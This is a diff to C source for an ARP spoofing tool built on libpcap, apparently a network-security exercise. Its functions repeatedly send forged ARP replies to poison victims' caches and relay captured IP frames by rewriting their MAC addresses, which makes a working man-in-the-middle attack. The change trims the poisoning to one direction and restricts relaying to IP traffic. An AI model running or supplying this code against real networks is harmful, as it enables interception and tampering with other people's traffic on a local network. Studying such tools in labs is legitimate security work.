@@ -176,7 +176,6 @@ void* ARPInfection_regular(void *pinfo)
 	while(true)
 	{
 		SendPacket(handle, info.dst_ip, info.src_ip, info.myMac, info.srcMac, 2, "Regular");
-		SendPacket(handle, info.src_ip, info.dst_ip, info.myMac, info.dstMac, 2, "Regular");
 		sleep(30);
 	}
 
@@ -209,7 +208,7 @@ void* ARPInfection_irregular(void *ainfo)
 	    unsigned short eth_type;
 
 	    int res = pcap_next_ex(handle, &header, &packet);
-	    int flag = 0;
+	    int flag;
 
 	    if (res == 0) continue;
 	    if (res == -1 || res == -2) break;
@@ -217,7 +216,8 @@ void* ARPInfection_irregular(void *ainfo)
 	    eth_h = (struct ether_header*)packet;
 	    eth_type = htons(eth_h->ether_type);
 	    packet_size = header->caplen;
-	    
+	    flag = 0;
+
 	    if (eth_type == ETHERTYPE_ARP)
 	    {
 	      arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));
@@ -230,36 +230,26 @@ void* ARPInfection_irregular(void *ainfo)
 	      		flag = 1;
 	      		break;
 	      	}
-	      	else if (!memcmp((char*)&(info->all_src_ip[i]), arp_h->arp_spa, 4) &&
-	      		!memcmp((char*)info->all_dst_ip, arp_h->arp_tpa, 4) && arp_h->ea_hdr.ar_op == ntohs(0x02)){	
-	      		SendPacket(handle, &(info->all_src_ip[i]), &(info->all_dst_ip[i]),
-	      			info->myMac, info->all_dstMac[i], 2, "Irregular");
-	      		flag = -1;
-	      		break;
-	      	}
 	  	  }
 	  	  if(flag)
 	  	  	continue;
 	    }
     	
-    	ip_h = (struct ip*)(packet + sizeof(struct ether_header));
-
-    	for(int i = 0; i < info->session_n; i++)
-    	{
-			if(!memcmp(eth_h->ether_shost, info->all_srcMac[i], 6) && !memcmp(eth_h->ether_dhost, info->myMac, 6)
-				&& ((*(int*)&ip_h->ip_dst) != (*(int*)&info->my_ip)))
-			{
-				memcpy(eth_h->ether_shost, info->myMac, 6);
-				memcpy(eth_h->ether_dhost, info->all_dstMac[i], 6);
-				break;
+    	if (eth_type == ETHERTYPE_IP)
+    	{	
+	    	ip_h = (struct ip*)(packet + sizeof(struct ether_header));
+	
+	    	for(int i = 0; i < info->session_n; i++)
+	    	{
+				if(!memcmp(eth_h->ether_shost, info->all_srcMac[i], 6) && !memcmp(eth_h->ether_dhost, info->myMac, 6)
+					&& ((*(int*)&ip_h->ip_dst) != (*(int*)&info->my_ip)))
+				{
+					memcpy(eth_h->ether_shost, info->myMac, 6);
+					memcpy(eth_h->ether_dhost, info->all_dstMac[i], 6);
+					break;
+				}
 			}
-			else if(!memcmp(eth_h->ether_shost, info->all_dstMac[i], 6) && !memcmp(eth_h->ether_dhost, info->myMac, 6)
-				&& ((*(int*)&ip_h->ip_dst) != (*(int*)&info->my_ip)))
-			{
-				memcpy(eth_h->ether_shost, info->myMac, 6);
-    			memcpy(eth_h->ether_dhost, info->all_srcMac[i], 6);
-			}
-		}
+    	}
 		pcap_sendpacket(handle, packet, packet_size);
     }
 }
